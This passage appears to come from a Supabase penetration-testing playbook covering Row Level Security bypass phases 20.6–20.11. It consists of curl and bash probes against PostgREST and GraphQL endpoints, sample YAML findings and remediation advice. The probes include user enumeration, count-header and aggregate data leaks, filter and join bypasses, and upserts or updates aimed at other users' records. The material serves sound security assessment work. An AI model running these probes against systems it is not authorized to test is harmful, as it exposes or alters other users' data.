  -H "Prefer: return=representation" \
  -d '{"is_public": true}'

# Then check if others can access
curl -s "$SUPABASE_URL/rest/v1/$TABLE?select=*&is_public=eq.true" \
  -H "apikey: $ANON_KEY" | jq 'length'

# === Test 6: Subquery/function policy bypass ===
echo "=== 20.6.6: Subquery policy patterns ==="

# Some policies use subqueries:
# - user_id IN (SELECT member_id FROM team_members WHERE team_id = ...)
# Test if team membership affects access

curl -s "$SUPABASE_URL/rest/v1/team_members?select=team_id" \
  -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $ACCESS_TOKEN" | jq '.[].team_id' | while read TEAM_ID; do
    echo "Testing team: $TEAM_ID"
    curl -s "$SUPABASE_URL/rest/v1/projects?select=id&team_id=eq.$TEAM_ID" \
      -H "apikey: $ANON_KEY" \
      -H "Authorization: Bearer $ACCESS_TOKEN" | jq 'length'
done
```

### Output

```yaml
phase_20_6:
  status: completed

  policy_reverse_engineering:
    tables_analyzed: {number}

    inferred_policies:
      - table: "profiles"
        inferred_logic:
          select: "user_id = auth.uid() OR is_public = true"
          update: "user_id = auth.uid()"
          delete: "user_id = auth.uid()"
        weaknesses:
          - "OR condition with user-controllable is_public flag"
          - "No NULL check on user_id"

      - table: "documents"
        inferred_logic:
          select: "org_id = (auth.jwt()->'app_metadata'->>'org_id')::uuid"
        weaknesses:
          - "Type coercion may fail silently on invalid org_id"

    exploitable_conditions:
      - table: "profiles"
        condition: "is_public=eq.true"
        vulnerability: "User can set is_public to make own record visible, but policy allows reading ALL public records"
        impact: "Can read public records of other users"
        severity: "MEDIUM"

      - table: "documents"
        condition: "NULL user_id"
        vulnerability: "Records with NULL user_id are accessible to all"
        records_affected: 15
        severity: "HIGH"

    jwt_claim_dependencies:
      - claim: "email"
        used_in: ["profiles"]
      - claim: "app_metadata.org_id"
        used_in: ["documents", "projects"]

  severity: "{highest severity}"
```

---

## Phase 20.7: Trigger/Function Chain Analysis (Extended)

### Objective
Analyze trigger and function chains that may execute with elevated privileges (SECURITY DEFINER) and bypass RLS during data operations.

### Understanding Trigger Chain Vulnerabilities

```yaml
# Trigger execution chain:
# User INSERT/UPDATE/DELETE → BEFORE Trigger → RLS Check → AFTER Trigger
#
# Vulnerabilities:
# 1. BEFORE trigger with SECURITY DEFINER modifies data before RLS check
# 2. AFTER trigger exposes data via logging/notifications
# 3. Trigger calls function that bypasses RLS
# 4. Cascading triggers across tables with different RLS

# Example attack:
# - User updates own profile (allowed by RLS)
# - AFTER trigger copies data to audit table
# - Audit table has no RLS → data exposed
```

### Execution

```bash
# === Test 1: Identify trigger-induced side effects ===
echo "=== 20.7.1: Trigger side effect discovery ==="

# Make an update and observe what else changes
BEFORE_STATE=$(curl -s "$SUPABASE_URL/rest/v1/audit_log?select=*&order=created_at.desc&limit=5" \
  -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $ACCESS_TOKEN")

# Trigger an update
curl -s -X PATCH "$SUPABASE_URL/rest/v1/profiles?id=eq.$MY_USER_ID" \
  -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"updated_at": "2024-01-01T00:00:00Z"}'

sleep 1

AFTER_STATE=$(curl -s "$SUPABASE_URL/rest/v1/audit_log?select=*&order=created_at.desc&limit=5" \
  -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $ACCESS_TOKEN")

# Compare
echo "Before: $(echo $BEFORE_STATE | jq 'length') records"
echo "After: $(echo $AFTER_STATE | jq 'length') records"

# Check if audit log captured the change
echo "New audit entries:"
echo "$AFTER_STATE" | jq '.[0]'

# === Test 2: Test notification/webhook triggers ===
echo "=== 20.7.2: Notification trigger analysis ==="

# Some triggers send data to external services
# Check for notification patterns

NOTIFICATION_TABLES=("notifications" "webhooks" "events" "queue")

for TABLE in "${NOTIFICATION_TABLES[@]}"; do
  RESPONSE=$(curl -s "$SUPABASE_URL/rest/v1/$TABLE?select=*&limit=10" \
    -H "apikey: $ANON_KEY" \
    -H "Authorization: Bearer $ACCESS_TOKEN" 2>/dev/null)

  if echo "$RESPONSE" | grep -q '"id"'; then
    echo "FOUND: $TABLE - may contain triggered data"
    echo "$RESPONSE" | jq '.[0]'
  fi
done

# === Test 3: Cascade delete/update analysis ===
echo "=== 20.7.3: Cascade operation analysis ==="

# Create a resource with dependencies
# Then delete parent and observe child table changes

# Example: User → Orders → Order Items
# Delete user should cascade, but what data is exposed in the process?

# === Test 4: Realtime trigger exploitation ===
echo "=== 20.7.4: Realtime subscription during triggers ==="

# Supabase Realtime broadcasts changes
# Even if RLS blocks direct access, realtime events may leak data

# Subscribe to table changes via WebSocket
# (See FASE 6/18 for WebSocket testing)
```

### Trigger Chain Mapping

```bash
# === Test 5: Map trigger dependencies ===
echo "=== 20.7.5: Trigger dependency mapping ==="

# Test cascading effects across related tables
PARENT_TABLE="users"
CHILD_TABLES=("profiles" "orders" "settings" "documents")

# Create test data in parent
echo "Creating parent record..."
PARENT_RESPONSE=$(curl -s -X POST "$SUPABASE_URL/rest/v1/$PARENT_TABLE" \
  -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  -H "Prefer: return=representation" \
  -d '{"email": "trigger-test@test.local"}')

PARENT_ID=$(echo "$PARENT_RESPONSE" | jq -r '.[0].id // .id')

# Check child tables for auto-created records (trigger behavior)
for TABLE in "${CHILD_TABLES[@]}"; do
  echo "Checking $TABLE for trigger-created records..."
  curl -s "$SUPABASE_URL/rest/v1/$TABLE?select=*&user_id=eq.$PARENT_ID" \
    -H "apikey: $ANON_KEY" \
    -H "Authorization: Bearer $ACCESS_TOKEN" | jq 'length'
done
```

### Output

```yaml
phase_20_7:
  status: completed

  trigger_chain_analysis:
    triggers_detected: {number}

    trigger_side_effects:
      - trigger_source: "profiles UPDATE"
        effect: "Creates audit_log entry"
        audit_table_rls: "None (public access)"
        data_leaked: ["user_id", "old_email", "new_email"]
        severity: "HIGH"

      - trigger_source: "users INSERT"
        effect: "Creates profile, settings, notifications"
        child_tables_affected: 3
        rls_consistency: "Profiles: strict, Settings: none, Notifications: none"
        severity: "MEDIUM"

    vulnerable_chains:
      - chain: "orders INSERT → order_history → analytics"
        vulnerability: "Analytics table has no RLS, aggregates all order data"
        data_exposed: "Order totals, customer counts"
        severity: "HIGH"

    realtime_leakage:
      tested: true
      leaky_tables: [{tables that broadcast sensitive data}]
      severity: "HIGH"

    cascade_operations:
      tested: true
      data_exposure_during_cascade: {true|false}

  severity: "HIGH"
```

---

## Phase 20.9: Aggregate Function Bypass (Extended)

### Objective
Test if RLS can be bypassed using aggregate functions (COUNT, SUM, AVG, etc.) to infer protected data without direct SELECT access.

### Understanding Side-Channel Attacks

```yaml
# RLS typically controls row-level access
# But aggregate functions may still compute over ALL rows
#
# Attack scenarios:
# 1. COUNT(*) returns total rows (including others' data)
# 2. SUM(amount) includes protected records in total
# 3. AVG reveals statistical information about protected data
# 4. MIN/MAX leaks boundary values
#
# Even without SELECT, attacker learns:
# - How many records exist
# - Total values (revenue, credits, etc.)
# - Data distribution patterns
```

### Execution

```bash
# === Test 1: COUNT aggregate bypass ===
echo "=== 20.9.1: COUNT aggregate test ==="

# Direct SELECT count (should only count accessible records)
DIRECT_COUNT=$(curl -s "$SUPABASE_URL/rest/v1/profiles?select=id" \
  -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $ACCESS_TOKEN" | jq 'length')

# PostgREST HEAD request returns count header
AGGREGATE_COUNT=$(curl -s -I "$SUPABASE_URL/rest/v1/profiles" \
  -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Prefer: count=exact" | grep -i "content-range" | grep -oE '[0-9]+$')

echo "Direct SELECT count: $DIRECT_COUNT"
echo "Aggregate count (header): $AGGREGATE_COUNT"

if [ "$AGGREGATE_COUNT" -gt "$DIRECT_COUNT" ]; then
  echo "CRITICAL: Aggregate count ($AGGREGATE_COUNT) > direct count ($DIRECT_COUNT)"
  echo "RLS bypassed via COUNT aggregate!"
fi

# === Test 2: SUM/AVG aggregate bypass ===
echo "=== 20.9.2: SUM/AVG aggregate test ==="

# Test on tables with numeric columns
FINANCIAL_TABLES=("orders" "payments" "transactions" "invoices")

for TABLE in "${FINANCIAL_TABLES[@]}"; do
  # Try to get sum via RPC or computed column
  curl -s -X POST "$SUPABASE_URL/rest/v1/rpc/get_${TABLE}_total" \
    -H "apikey: $ANON_KEY" \
    -H "Authorization: Bearer $ACCESS_TOKEN" \
    -H "Content-Type: application/json" \
    -d '{}' 2>/dev/null
done

# === Test 3: GraphQL aggregate queries ===
echo "=== 20.9.3: GraphQL aggregates ==="

curl -s -X POST "$SUPABASE_URL/graphql/v1" \
  -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{
      profilesCollection {
        totalCount
      }
    }"
  }' | jq '.data.profilesCollection.totalCount'

curl -s -X POST "$SUPABASE_URL/graphql/v1" \
  -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{
      ordersCollection {
        totalCount
        aggregates {
          sum { total }
          avg { total }
        }
      }
    }"
  }' | jq '.'

# === Test 4: Binary search inference ===
echo "=== 20.9.4: Binary search data inference ==="

# Even without aggregates, we can infer counts via binary search
# Test: How many users have email starting with 'a'?

for LETTER in a b c d e f g h i j; do
  COUNT=$(curl -s "$SUPABASE_URL/rest/v1/profiles?select=id&email=ilike.${LETTER}%25" \
    -H "apikey: $ANON_KEY" \
    -H "Authorization: Bearer $ACCESS_TOKEN" \
    -H "Prefer: count=exact" \
    -I | grep -i "content-range" | grep -oE '/[0-9]+' | tr -d '/')

  if [ "$COUNT" -gt "0" ]; then
    echo "Emails starting with '$LETTER': $COUNT"
  fi
done
```

### Advanced Inference Attacks

```bash
# === Test 5: Boolean-based data inference ===
echo "=== 20.9.5: Boolean inference attack ==="

# Check if specific email exists (user enumeration via RLS)
TEST_EMAILS=(
  "admin@target.com"
  "support@target.com"
  "ceo@target.com"
)

for EMAIL in "${TEST_EMAILS[@]}"; do
  # If RLS is misconfigured, this reveals existence
  RESPONSE=$(curl -s "$SUPABASE_URL/rest/v1/profiles?select=id&email=eq.$EMAIL" \
    -H "apikey: $ANON_KEY" \
    -H "Authorization: Bearer $ACCESS_TOKEN")

  COUNT=$(echo "$RESPONSE" | jq 'length')

  if [ "$COUNT" -gt "0" ]; then
    echo "EXISTS: $EMAIL"
  else
    echo "NOT FOUND: $EMAIL"
  fi
done

# === Test 6: Range-based value inference ===
echo "=== 20.9.6: Range inference attack ==="

# Infer credit balances, salary ranges, etc.
for MIN in 0 100 1000 10000 100000; do
  MAX=$((MIN * 10))
  COUNT=$(curl -s "$SUPABASE_URL/rest/v1/users?select=id&credits=gte.$MIN&credits=lt.$MAX" \
    -H "apikey: $ANON_KEY" \
    -H "Authorization: Bearer $ACCESS_TOKEN" \
    -H "Prefer: count=exact" \
    -I | grep -i "content-range" | grep -oE '/[0-9]+' | tr -d '/')

  echo "Users with credits $MIN-$MAX: ${COUNT:-0}"
done
```

### Output

```yaml
phase_20_9:
  status: completed

  aggregate_bypass:
    count_mismatch:
      table: "profiles"
      direct_select_count: 1
      aggregate_count: 150
      vulnerability: "COUNT reveals total records beyond RLS"
      records_hidden_by_rls: 149
      severity: "HIGH"

    graphql_aggregates:
      totalCount_exposed: true
      sum_exposed: true
      avg_exposed: true
      data_inferred:
        - metric: "Total order value"
          value: "€150,000"
          my_contribution: "€500"
          severity: "HIGH"

    inference_attacks:
      user_enumeration:
        possible: true
        emails_discovered: ["admin@target.com", "ceo@target.com"]
        severity: "MEDIUM"

      range_inference:
        credit_distribution_leaked: true
        salary_ranges_inferable: true
        severity: "MEDIUM"

    vulnerable:
      - attack: "Content-Range header count"
        table: "profiles"
        severity: "HIGH"
        poc: |
          curl -I "$SUPABASE_URL/rest/v1/profiles" \
            -H "apikey: $KEY" -H "Prefer: count=exact"

  severity: "HIGH"
```

---

## Phase 20.10: PostgREST-Specific Bypass (Extended)

### Objective
Test Supabase-specific attack vectors that exploit PostgREST API features not covered by standard RLS testing.

### Understanding PostgREST Attack Surface

```yaml
# PostgREST exposes PostgreSQL via REST API
# Features that can bypass or extend RLS:

# 1. Horizontal Filtering (query params)
#    - or, and, not operators
#    - Complex filter combinations

# 2. Resource Embedding (JOINs)
#    - select=*,related_table(*)
#    - Can expose data via relationships

# 3. Bulk Operations
#    - Mass INSERT/UPDATE/DELETE
#    - May bypass per-row checks

# 4. RPC Functions
#    - Direct function calls
#    - May have SECURITY DEFINER

# 5. Prefer Headers
#    - return=representation
#    - count=exact
#    - resolution=merge-duplicates
```

### Execution

```bash
# === Test 1: Complex filter bypass ===
echo "=== 20.10.1: PostgREST filter operators ==="

TABLE="profiles"

# Test OR operator bypass
# Policy: user_id = auth.uid()
# Attack: Try to access with OR condition

curl -s "$SUPABASE_URL/rest/v1/$TABLE?select=*&or=(id.eq.$MY_USER_ID,id.eq.$OTHER_USER_ID)" \
  -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $ACCESS_TOKEN" | jq 'length'

# Test NOT operator
curl -s "$SUPABASE_URL/rest/v1/$TABLE?select=*&id=not.eq.$MY_USER_ID" \
  -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $ACCESS_TOKEN" | jq 'length'

# Test complex nested filters
curl -s "$SUPABASE_URL/rest/v1/$TABLE?select=*&and=(or(id.eq.$MY_USER_ID,id.eq.$OTHER_USER_ID),is_active.eq.true)" \
  -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $ACCESS_TOKEN" | jq 'length'

# === Test 2: Embedding with inner JOIN ===
echo "=== 20.10.2: Inner JOIN embedding ==="

# Inner JOIN may expose data from protected tables
curl -s "$SUPABASE_URL/rest/v1/orders?select=*,profiles!inner(*)" \
  -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $ACCESS_TOKEN" | jq '.[0:3]'

# Test embedding with filter on embedded table
curl -s "$SUPABASE_URL/rest/v1/orders?select=*,profiles!inner(*)&profiles.role=eq.admin" \
  -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $ACCESS_TOKEN" | jq '.'

# === Test 3: Bulk operation bypass ===
echo "=== 20.10.3: Bulk operation testing ==="

# Bulk INSERT
curl -s -X POST "$SUPABASE_URL/rest/v1/$TABLE" \
  -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  -H "Prefer: return=representation" \
  -d '[
    {"name": "Bulk Test 1"},
    {"name": "Bulk Test 2"},
    {"name": "Bulk Test 3", "user_id": "'$OTHER_USER_ID'"}
  ]' | jq '.'

# Bulk UPDATE (try to update records of other users)
curl -s -X PATCH "$SUPABASE_URL/rest/v1/$TABLE?id=in.($MY_ID,$OTHER_ID)" \
  -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"updated_at": "2024-01-01T00:00:00Z"}' | jq '.'

# === Test 4: Prefer header manipulation ===
echo "=== 20.10.4: Prefer header bypass ==="

# Test different Prefer options
PREFER_OPTIONS=(
  "return=representation"
  "return=headers-only"
  "count=exact"
  "count=planned"
  "count=estimated"
  "resolution=merge-duplicates"
  "resolution=ignore-duplicates"
  "missing=default"
)

for PREFER in "${PREFER_OPTIONS[@]}"; do
  echo "Testing Prefer: $PREFER"
  curl -s -I "$SUPABASE_URL/rest/v1/$TABLE" \
    -H "apikey: $ANON_KEY" \
    -H "Authorization: Bearer $ACCESS_TOKEN" \
    -H "Prefer: $PREFER" 2>/dev/null | grep -E "(content-range|x-)"
done

# === Test 5: Upsert bypass ===
echo "=== 20.10.5: UPSERT operation testing ==="

# UPSERT may bypass INSERT/UPDATE RLS checks
curl -s -X POST "$SUPABASE_URL/rest/v1/$TABLE" \
  -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  -H "Prefer: resolution=merge-duplicates,return=representation" \
  -d '{"id": "'$OTHER_USER_ID'", "name": "UPSERT Bypass Test"}' | jq '.'

# === Test 6: Range header manipulation ===
echo "=== 20.10.6: Range header bypass ==="

# Try to get more records than RLS should allow
curl -s "$SUPABASE_URL/rest/v1/$TABLE?select=*" \
  -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Range: 0-999" \
  -H "Range-Unit: items" | jq 'length'

# === Test 7: Select expression injection ===
echo "=== 20.10.7: Select expression testing ==="

# Try computed columns and expressions
curl -s "$SUPABASE_URL/rest/v1/$TABLE?select=*,computed_field:concat(first_name,last_name)" \
  -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $ACCESS_TOKEN" | jq '.[0]'

# Try to select from system tables
curl -s "$SUPABASE_URL/rest/v1/$TABLE?select=*,pg_roles(*)" \
  -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $ACCESS_TOKEN" | jq '.'
```

### Output

```yaml
phase_20_10:
  status: completed

  postgrest_bypass:
    filter_operators:
      or_bypass:
        tested: true
        vulnerable: false
        result: "RLS applied before OR evaluation"
      not_operator:
        tested: true
        vulnerable: true
        description: "NOT filter returns records that should be hidden"
        severity: "HIGH"

    embedding_bypass:
      inner_join:
        tested: true
        vulnerable: true
        description: "Inner JOIN exposes profiles via orders relationship"
        severity: "CRITICAL"

    bulk_operations:
      bulk_insert:
        tested: true
        other_user_injection: false
      bulk_update:
        tested: true
        cross_user_update: false

    prefer_headers:
      count_exact_leaks_total: true
      severity: "MEDIUM"

    upsert_bypass:
      tested: true
      vulnerable: false

    vulnerable:
      - attack: "Inner JOIN embedding"
        poc: |
          curl "$SUPABASE_URL/rest/v1/orders?select=*,profiles!inner(*)" \
            -H "apikey: $KEY" -H "Authorization: Bearer $TOKEN"
        severity: "CRITICAL"

      - attack: "NOT filter bypass"
        poc: |
          curl "$SUPABASE_URL/rest/v1/profiles?select=*&id=not.eq.$MY_ID" \
            -H "apikey: $KEY"
        severity: "HIGH"

  severity: "CRITICAL"
```

---

## Phase 20.11: RLS Policy Condition Manipulation (Extended)

### Objective
Test edge cases and boundary conditions in RLS policies, including NULL handling, type coercion, and special values.

### Understanding Edge Cases

```yaml
# RLS policies often fail on edge cases:

# 1. NULL Handling
#    - NULL = NULL is FALSE in SQL
#    - Policies may not account for NULL user_id
#    - IS DISTINCT FROM vs = operator

# 2. Type Coercion
#    - String '1' vs Integer 1
#    - UUID vs String comparison
#    - JSON field access failures

# 3. Special Values
#    - Empty string '' vs NULL
#    - UUID edge cases (0000-0000-...)
#    - Negative numbers, infinity

# 4. Encoding Tricks
#    - URL encoding bypass
#    - Unicode normalization
```

### Execution

```bash
# === Test 1: NULL value exploitation ===
echo "=== 20.11.1: NULL value testing ==="

# Records with NULL user_id often bypass RLS
# Policy: user_id = auth.uid() doesn't match NULL

curl -s "$SUPABASE_URL/rest/v1/profiles?select=*&user_id=is.null" \
  -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $ACCESS_TOKEN" | jq '.'

curl -s "$SUPABASE_URL/rest/v1/documents?select=*&owner_id=is.null" \
  -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $ACCESS_TOKEN" | jq '.'

# Test inserting with NULL user_id
curl -s -X POST "$SUPABASE_URL/rest/v1/profiles" \
  -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  -H "Prefer: return=representation" \
  -d '{"name": "NULL Test", "user_id": null}' | jq '.'

# === Test 2: Type coercion attacks ===
echo "=== 20.11.2: Type coercion testing ==="

# UUID vs string
curl -s "$SUPABASE_URL/rest/v1/profiles?select=*&id=eq.not-a-uuid" \
  -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $ACCESS_TOKEN" | jq '.'

# Integer vs string in numeric fields
curl -s "$SUPABASE_URL/rest/v1/orders?select=*&total=eq.'100'" \
  -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $ACCESS_TOKEN" | jq '.'

# Boolean coercion
curl -s "$SUPABASE_URL/rest/v1/profiles?select=*&is_active=eq.1" \
  -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $ACCESS_TOKEN" | jq '.'

curl -s "$SUPABASE_URL/rest/v1/profiles?select=*&is_active=eq.'true'" \
  -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $ACCESS_TOKEN" | jq '.'

# === Test 3: Special UUID values ===
echo "=== 20.11.3: Special UUID testing ==="

SPECIAL_UUIDS=(
  "00000000-0000-0000-0000-000000000000"
  "ffffffff-ffff-ffff-ffff-ffffffffffff"
  "00000000-0000-0000-0000-000000000001"
)

for UUID in "${SPECIAL_UUIDS[@]}"; do
  echo "Testing UUID: $UUID"
  curl -s "$SUPABASE_URL/rest/v1/profiles?select=*&id=eq.$UUID" \
    -H "apikey: $ANON_KEY" \
    -H "Authorization: Bearer $ACCESS_TOKEN" | jq 'length'
done

# === Test 4: Empty string vs NULL ===
echo "=== 20.11.4: Empty string testing ==="

curl -s "$SUPABASE_URL/rest/v1/profiles?select=*&email=eq." \
  -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $ACCESS_TOKEN" | jq '.'

curl -s "$SUPABASE_URL/rest/v1/profiles?select=*&email=is.null" \
  -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $ACCESS_TOKEN" | jq '.'

# === Test 5: JSON field access edge cases ===
echo "=== 20.11.5: JSON field edge cases ==="

# Test JSONB policy conditions
# Policy might be: metadata->>'org_id' = auth.jwt()->>'org_id'

# Try accessing with missing metadata
curl -s "$SUPABASE_URL/rest/v1/documents?select=*&metadata=is.null" \
  -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $ACCESS_TOKEN" | jq '.'

# Try accessing with empty metadata
curl -s "$SUPABASE_URL/rest/v1/documents?select=*&metadata=eq.{}" \
  -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $ACCESS_TOKEN" | jq '.'

# === Test 6: URL encoding bypass ===
echo "=== 20.11.6: Encoding bypass testing ==="

# Double URL encoding
curl -s "$SUPABASE_URL/rest/v1/profiles?select=*&id=eq.%24%7BOTHER_USER_ID%7D" \
  -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $ACCESS_TOKEN" | jq '.'

# Unicode variations
curl -s "$SUPABASE_URL/rest/v1/profiles?select=*&email=eq.admin%40target.com" \
  -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $ACCESS_TOKEN" | jq '.'

# === Test 7: Numeric edge cases ===
echo "=== 20.11.7: Numeric edge case testing ==="

# Negative values
curl -s "$SUPABASE_URL/rest/v1/transactions?select=*&amount=lt.0" \
  -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $ACCESS_TOKEN" | jq '.'

# Very large values (potential overflow)
curl -s "$SUPABASE_URL/rest/v1/orders?select=*&total=gt.999999999999999" \
  -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $ACCESS_TOKEN" | jq '.'

# Decimal precision
curl -s "$SUPABASE_URL/rest/v1/orders?select=*&total=eq.100.000000000001" \
  -H "apikey: $ANON_KEY" \
  -H "Authorization: Bearer $ACCESS_TOKEN" | jq '.'
```

### Output

```yaml
phase_20_11:
  status: completed

  condition_manipulation:
    null_handling:
      null_user_id_accessible: true
      records_with_null_owner: 12
      severity: "CRITICAL"
      poc: |
        curl "$SUPABASE_URL/rest/v1/documents?select=*&owner_id=is.null" \
          -H "apikey: $KEY"

    type_coercion:
      string_to_uuid_error: true  # Good - fails safely
      string_to_boolean_coerced: true  # Bad - '1' treated as true
      severity: "LOW"

    special_uuids:
      all_zeros_accessible: false
      all_ones_accessible: false

    empty_vs_null:
      treated_differently: true
      empty_string_records: 3
      null_records: 0
      severity: "LOW"

    json_edge_cases:
      null_metadata_accessible: true
      empty_metadata_accessible: true
      severity: "MEDIUM"

    encoding_bypass:
      double_encoding_works: false
      unicode_normalization_bypass: false

    numeric_edge_cases:
      negative_values_accessible: true
      overflow_handled: true

    vulnerable:
      - condition: "NULL user_id"
        vulnerability: "Records with NULL owner accessible to all"
        records: 12
        severity: "CRITICAL"

      - condition: "NULL metadata"
        vulnerability: "Documents without metadata bypass org check"
        records: 5
        severity: "HIGH"

  severity: "CRITICAL"
```

---

## Output Format

### FASE_20_RESULTS YAML Structure

```yaml
FASE_20_RESULTS:
  target_url: "{url}"
  supabase_url: "{supabase_project_url}"
  scan_timestamp: "{ISO timestamp}"
  status: "{completed|partial|blocked}"

  # Core Checklist (20.1-20.5)
  role_testing:
    tested: {yes|no}
    anon_access_issues: {count}
    auth_differentiation_issues: {count}
    severity: "{severity}"

  join_bypass:
    tested: {yes|no}
    vulnerable_embeddings: {count}
    data_exposed_via_joins: {count}
    severity: "{severity}"

  function_exploitation:
    tested: {yes|no}
    security_definer_found: {count}
    rls_bypass_functions: {count}
    severity: "{severity}"

  view_exploitation:
    tested: {yes|no}
    vulnerable_views: {count}
    severity: "{severity}"

  temporal_bypass:
    tested: {yes|no}
    deleted_records_exposed: {count}
    audit_tables_exposed: {count}
    severity: "{severity}"

  # Extended Analysis (20.6-20.11)
  policy_reverse_engineering:
    tables_analyzed: {number}
    inferred_policies: {count}
    exploitable_conditions: {count}
    severity: "{severity}"

  trigger_chain_analysis:
    triggers_detected: {number}
    vulnerable_chains: {count}
    data_leaked_via_triggers: {yes|no}
    severity: "{severity}"

  aggregate_bypass:
    count_mismatch: {yes|no}
    aggregate_data_leaked: {yes|no}
    inference_attacks_possible: {yes|no}
    severity: "{severity}"

  postgrest_bypass:
    filter_bypasses: {count}
    embedding_bypasses: {count}
    bulk_operation_issues: {count}
    severity: "{severity}"

  condition_manipulation:
    null_handling_issues: {count}
    type_coercion_issues: {count}
    edge_case_bypasses: {count}
    severity: "{severity}"

  # Summary
  critical_findings:
    count: {number}
    items:
      - finding: "{description}"
        table: "{table}"
        poc: "{curl command}"
        records_exposed: {number}

  high_findings:
    count: {number}
    items: [{list}]

  medium_findings:
    count: {number}
    items: [{list}]

  # Recommendations
  recommendations:
    immediate:
      - "Enable RLS on {table}"
      - "Add NULL check to {policy}"
      - "Review SECURITY DEFINER function {name}"
    short_term:
      - "Audit all views for RLS consistency"
      - "Implement aggregate-level RLS"
    long_term:
      - "Implement policy testing in CI/CD"
      - "Regular RLS audit schedule"

  overall_severity: "{CRITICAL|HIGH|MEDIUM|LOW}"
```

---

## References

### Internal References
- `Documentos/App/CHECKLIST.md` - Phase 20 original checklist
- `clients/{name}/SCAN-IN-PROGRESS.md` - Previous phase results
- Previous phases for context: FASE 2 (schema), FASE 3 (basic RLS), FASE 8 (JWT)

### Supabase Documentation
- [Row Level Security](https://supabase.com/docs/guides/auth/row-level-security)
- [PostgREST API](https://supabase.com/docs/guides/api)
- [Database Functions](https://supabase.com/docs/guides/database/functions)

### PostgreSQL Security
- [PostgreSQL RLS Documentation](https://www.postgresql.org/docs/current/ddl-rowsecurity.html)
- [SECURITY DEFINER Functions](https://www.postgresql.org/docs/current/sql-createfunction.html)
- [Policy Best Practices](https://www.postgresql.org/docs/current/sql-createpolicy.html)

### Research & Techniques
- OWASP API Security - Broken Object Level Authorization (BOLA)
- PortSwigger - Access Control Vulnerabilities
- HackTricks - PostgreSQL Injection

---

## Error Handling

**If Supabase URL not available:**
```yaml
FASE_20_RESULTS:
  status: blocked
  reason: "Supabase URL not extracted in FASE 1"
  action: "Re-run FASE 1 to extract Supabase configuration"
```

**If no RLS detected:**
```yaml
FASE_20_RESULTS:
  status: partial
  reason: "No RLS policies detected - all tables publicly accessible"
  note: "This is already a CRITICAL vulnerability - document in FASE 3"
```

**If rate limited:**
```yaml
FASE_20_RESULTS:
  status: partial
  rate_limited_at: "20.10"
  completed_phases: ["20.1", "20.2", "20.3", "20.4", "20.5", "20.6"]
  recommendation: "Add delays between requests, resume from 20.10"
```
